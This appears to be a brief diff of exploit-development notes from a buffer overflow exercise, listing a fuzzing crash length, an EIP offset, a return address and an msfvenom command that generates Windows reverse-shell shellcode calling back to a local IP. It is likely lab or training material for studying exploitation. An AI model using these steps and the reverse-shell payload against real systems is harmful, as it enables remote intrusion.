@@ -1,0 +1,8 @@
+Fuzzing crashed at 2200 bytes
+EIP contains normal pattern : 0x31704330 (offset 2012)
+6250151B
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.20 LPORT=445 EXITFUNC=thread -b "\x00" -f c
+
+
+
+
